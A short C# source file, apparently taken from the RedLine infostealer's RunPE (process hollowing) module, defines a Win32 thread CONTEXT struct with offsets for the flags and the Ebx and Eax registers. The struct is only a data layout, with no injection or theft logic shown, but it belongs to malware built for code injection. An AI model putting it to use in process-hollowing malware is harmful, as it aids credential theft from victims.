using System.Runtime.InteropServices;

namespace RedLine.Models.RunPE
{
	[StructLayout(LayoutKind.Explicit, Pack = 16, Size = 716)]
	public struct CONTEXT
	{
		[FieldOffset(0)]
		public uint ContextFlags;

		[FieldOffset(164)]
		public uint Ebx;

		[FieldOffset(176)]
		public uint Eax;
	}
}
